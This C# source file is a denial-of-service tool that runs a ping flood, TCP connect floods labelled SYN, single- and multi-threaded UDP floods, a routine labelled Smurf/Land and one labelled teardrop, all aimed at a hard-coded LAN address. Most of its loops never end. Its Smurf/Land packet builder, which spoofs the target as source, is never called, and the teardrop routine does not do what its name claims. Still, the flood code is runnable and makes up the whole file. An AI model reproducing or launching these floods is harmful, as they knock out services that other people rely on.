using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Threading;
using System.Diagnostics;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets;

namespace Dos_attack_different_types_
{
    class Program
    {
        static void Main(string[] args)
        {
            PingFlood();
            ///////////////////////////////////////////
            Syn.port = 80;
            Syn.host = "192.168.1.39";
            Syn.synint = 4;
            Syn.loc = 4;
            Syn.syner();
            ///////////////////////////////////////////
            UDPFlood();
            MultiThreadUDPFlood();
            ///////////////////////////////////////////
            Smurf_Land.port_sm = 80;
            Smurf_Land.host_sm = "192.168.1.39";
            Smurf_Land.synint_sm = 4;
            Smurf_Land.loc_sm = 4;
            Smurf_Land.syner();
            ///////////////////////////////////////////
            TearDrop_Attack();
            Console.ReadLine();
        }
        static void PingFlood()
        {
            Ping pingSender = new Ping();
            PingOptions options = new PingOptions();
            options.DontFragment = true;
            byte[] buffer = new byte[65500];
            int timeout = 5000;
            byte[] bip = {192,168,1,39};
            IPAddress ip =new IPAddress(bip);
            for (int i = 0; i < 1000; )
            {
                Thread.Sleep(50);
                var pingReply = pingSender.Send(ip, timeout, buffer, new PingOptions(600, false));
                Console.WriteLine(pingReply.Status);
            }
        }
        static void UDPFlood()
        {
            Random rnd = new Random();
            int size;
            byte[] packetData;
            string IP = "192.168.1.39";
            int port = 80;
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), port);
            Socket client = new Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            for (int i = 0; i < 100000; )
            {
                size = rnd.Next() % 1000+1;
                packetData = new byte[size];
                client.SendTo(packetData, ep);
            }
        }
        static void MultiThreadUDPFlood()
        {
            Random rnd = new Random();
            int size;
            byte[] packetData;
            string IP = "192.168.1.39";
            int port = 80;
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), port);
            Socket client = new Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            new Thread(() =>
            {
                for (int i = 0; i < 100000; ++i)
                {
                    size = rnd.Next() % 1000 + 1;
                    packetData = new byte[size];
                    client.SendTo(packetData, ep);
                }
            });
            new Thread(() =>
            {
                for (int i = 0; i < 100000; ++i)
                {
                    size = rnd.Next() % 1000 + 1;
                    packetData = new byte[size];
                    client.SendTo(packetData, ep);
                }
            }).Start();
            new Thread(() =>
            {
                for (int i = 0; i < 100000; ++i)
                {
                    size = rnd.Next() % 1000 + 1;
                    packetData = new byte[size];
                    client.SendTo(packetData, ep);
                }
            }).Start();
            new Thread(() =>
            {
                for (int i = 0; i < 100000; ++i)
                {
                    size = rnd.Next() % 1000 + 1;
                    packetData = new byte[size];
                    client.SendTo(packetData, ep);
                }
            }).Start();
        }
        static void TearDrop_Attack()
        {
            byte[] opt = {1,2};
            byte[] buffer = new byte[36];
            string IP = "192.168.1.39";
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP),0);
            Socket client = new Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            for (int i = 0; i < 100;)
            {
                client.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.IPOptions,1);
                client.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.DontFragment, true);
                client.SendTo(buffer, ep);
                client.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.IPOptions, 0);
                client.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.DontFragment, false);
                client.SendTo(buffer, ep);
            }
        }
    }
    class Syn
    {
	    private static ThreadStart[] thrdstart;
	    private static Thread[] thrd;
	    public static string host;
	    private static IPEndPoint ipend;
	    public static int port;
	    private static SendSyn[] sndsyn;
	    public static int loc;
	    public static int synint;

	    public static void syner()
	    {
		    try
		    {
			    ipend = new IPEndPoint(Dns.GetHostEntry(host).AddressList[1], port);
		    }
		    catch
		    {
			    ipend = new IPEndPoint(IPAddress.Parse(host), port);
		    }
		    thrd = new Thread[synint];
		    thrdstart = new ThreadStart[synint];
		    sndsyn = new SendSyn[synint];
		    for (int i = 0; i < synint; i++)
		    {
			    sndsyn[i] = new SendSyn(ipend, loc);
			    thrdstart[i] = new ThreadStart(sndsyn[i].synthrd);
			    thrd[i] = new Thread(thrdstart[i]);
			    thrd[i].Start();
		    }
	    }

	    public static void synstop()
	    {
		    for (int i = 0; i < synint; i++)
		    {
			    try
			    {
				    thrd[i].Abort();
			    }
			    catch
			    {
			    }
		    }
	    }

	    private class SendSyn
	    {
		    private IPEndPoint synend;
		    private Socket[] synsock;
		    private int synint;

		    public SendSyn(IPEndPoint ipEo, int ar)
		    {
			    synend = ipEo;
			    synint = ar;
		    }

		    public void synrslt(IAsyncResult ar)
		    {
		    }

		    public void synthrd()
		    {
			    int iCount = 0;
			    Label_0000:
			    try
			    {
				    synsock = new Socket[synint];
				    for (iCount = 0; iCount < synint; iCount++)
				    {
					    synsock[iCount] = new Socket(synend.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
					    synsock[iCount].Blocking = false;
					    AsyncCallback async = new AsyncCallback(synrslt);
					    synsock[iCount].BeginConnect(synend, async, synsock[iCount]);
				    }
				    Thread.Sleep(100);
				    for (iCount = 0; iCount < synint; iCount++)
				    {
					    if (synsock[iCount].Connected)
					    {
						    synsock[iCount].Disconnect(false);
					    }
					    synsock[iCount].Close();
					    synsock[iCount] = null;
				    }
				    synsock = null;
				    goto Label_0000;
			    }
			    catch
			    {
				    for (iCount = 0; iCount < synint; iCount++)
				    {
					    try
					    {
						    if (synsock[iCount].Connected)
						    {
							    synsock[iCount].Disconnect(false);
						    }
						    synsock[iCount].Close();
						    synsock[iCount] = null;
					    }	
					    catch
					    {
					    }
				    }
				    goto Label_0000;
			    }
		    }
	    }
    }
    class Smurf_Land
    {
        private static ThreadStart[] thrdstart_sm;
        private static Thread[] thrd_sm;
        public static string host_sm;
        private static IPEndPoint ipend_sm;
        public static int port_sm;
        private static SendSmurf_LandSynPacket[] sndsyn_sm;
        public static int loc_sm;
        public static int synint_sm;

        public static void syner()
        {
            try
            {
                ipend_sm = new IPEndPoint(Dns.GetHostEntry(host_sm).AddressList[1], port_sm);
            }
            catch
            {
                ipend_sm = new IPEndPoint(IPAddress.Parse(host_sm), port_sm);
            }
            thrd_sm = new Thread[synint_sm];
            thrdstart_sm = new ThreadStart[synint_sm];
            sndsyn_sm = new SendSmurf_LandSynPacket[synint_sm];
            for (int i = 0; i < synint_sm; i++)
            {
                sndsyn_sm[i] = new SendSmurf_LandSynPacket(ipend_sm, loc_sm);
                thrdstart_sm[i] = new ThreadStart(sndsyn_sm[i].synthrd);
                thrd_sm[i] = new Thread(thrdstart_sm[i]);
                thrd_sm[i].Start();
            }
        }

        public static void synstop()
        {
            for (int i = 0; i < synint_sm; i++)
            {
                try
                {
                    thrd_sm[i].Abort();
                }
                catch
                {
                }
            }
        }

        private class SendSmurf_LandSynPacket
        {
            private IPEndPoint synend_sm;
            private Socket[] synsock_sm;
            private int synint_sm;

            public SendSmurf_LandSynPacket(IPEndPoint ipEo, int ar)
            {
                synend_sm = ipEo;
                synint_sm = ar;
            }

            public void synrslt(IAsyncResult ar)
            {
            }
            private static Packet BuildTcpPacket()
            {
                EthernetLayer ethernetLayer =
                    new EthernetLayer
                        {
                            Source = new MacAddress("01:01:01:01:01:01"),
                            Destination = new MacAddress("02:02:02:02:02:02"),
                            EtherType = EthernetType.None,
                        };

                IpV4Layer ipV4Layer =
                    new IpV4Layer
                        {
                            Source = new IpV4Address("192.168.1.39"),
                            CurrentDestination = new IpV4Address("192.168.1.39"),
                            Fragmentation = IpV4Fragmentation.None,
                            HeaderChecksum = null,
                            Identification = 123,
                            Options = IpV4Options.None,
                            Protocol = null,
                            Ttl = 100,
                            TypeOfService = 0,
                        };

                TcpLayer tcpLayer =
                    new TcpLayer
                        {
                            SourcePort = 4050,
                            DestinationPort = 25,
                            Checksum = null,
                            SequenceNumber = 100,
                            AcknowledgmentNumber = 50,
                            ControlBits = TcpControlBits.Acknowledgment,
                            Window = 100,
                            UrgentPointer = 0,
                            Options = TcpOptions.None,
                        };
                PayloadLayer payloadLayer =
                    new PayloadLayer
                        {
                            Data = new Datagram(Encoding.ASCII.GetBytes("hello world")),
                        };

                PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, tcpLayer, payloadLayer);

                return builder.Build(DateTime.Now);
            }
            public void synthrd()
            {
                int iCount = 0;
            Label_0000:
                try
                {
                    synsock_sm = new Socket[synint_sm];
                    for (iCount = 0; iCount < synint_sm; iCount++)
                    {
                        synsock_sm[iCount] = new Socket(synend_sm.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                        synsock_sm[iCount].Blocking = false;
                        AsyncCallback async = new AsyncCallback(synrslt);
                        synsock_sm[iCount].BeginConnect(synend_sm, async, synsock_sm[iCount]);
                    }
                    Thread.Sleep(100);
                    for (iCount = 0; iCount < synint_sm; iCount++)
                    {
                        if (synsock_sm[iCount].Connected)
                        {
                            synsock_sm[iCount].Disconnect(false);
                        }
                        synsock_sm[iCount].Close();
                        synsock_sm[iCount] = null;
                    }
                    synsock_sm = null;
                    goto Label_0000;
                }
                catch
                {
                    for (iCount = 0; iCount < synint_sm; iCount++)
                    {
                        try
                        {
                            if (synsock_sm[iCount].Connected)
                            {
                                synsock_sm[iCount].Disconnect(false);
                            }
                            synsock_sm[iCount].Close();
                            synsock_sm[iCount] = null;
                        }
                        catch
                        {
                        }
                    }
                    goto Label_0000;
                }
            }
        }
    }
}
